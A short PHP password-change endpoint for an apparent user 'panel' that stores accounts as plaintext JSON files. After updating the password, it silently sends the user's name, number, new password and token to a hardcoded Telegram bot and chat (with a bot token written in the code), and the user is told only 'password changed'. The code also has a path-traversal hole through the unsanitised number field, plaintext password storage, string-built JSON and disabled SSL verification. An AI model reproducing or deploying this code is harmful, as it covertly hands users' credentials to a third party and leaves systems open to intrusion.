<?php
$number=$_POST['number'];
$passold=$_POST['oldpassword'];
$newpassword=$_POST['newpassword'];
$rt="userdata/$number/$number.txt";
if(file_exists($rt)){
$content=file_get_contents($rt);
$json=json_decode($content,true);
$password=$json['password'];
$name=$json['name'];
$token=$json['token'];
$gateway_added=$json['gateway_added'];
$bot_added=$json['bot_added'];
$status=$json['status'];
if($passold==$password){
$dg='{"status":"'.$status.'","name":"'.$name.'","number":"'.$number.'","password":"'.$newpassword.'","token":"'.$token.'","gateway_added":"'.$gateway_added.'","bot_added":"'.$bot_added.'"}';
file_put_contents("userdata/$number/$number.txt",''.$dg.'');


	$status1=strtoupper($status);
	$msgt='ðŸš«USER CHANGED PASSWORDðŸš«

âœ…NAME ==>  `'.$name.'`

âœ…NUMBER ==>  `'.$number.'`

âœ…PASSWORD ==> `'.$newpassword.'`

âœ…STATUS ==>  *'.$status.'*

âœ…TOKEN ==> `'.$token.'`

âœ…PANEL BY ==> *@I_AMANKIT*
' ;
	$tes=urlencode($msgt);
	
	
	
	$url99='https://api.telegram.org/bot5224131825:AAG9QBqngjlXc-LtJgz3GfyfRx_GRJCsZ54/sendMessage?chat_id=1005500354&text='.$tes.'&parse_mode=markdown';
$headers[]='user-agent: Mozilla/5.0 (Linux; Android 10; TECNO KE6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36';
$ch=curl_init();
curl_setopt($ch,CURLOPT_URL,$url99);
curl_setopt($ch,CURLOPT_POST,1);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch,CURLOPT_HTTPHEADER,$headers);
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
$output=curl_exec($ch);



echo'{"status":"true","message":"password changed"}';
}else{echo'{"status":"true","message":"old password wronng"}';}}else{echo'{"status":"true","message":"number does not exists"}';}
?>
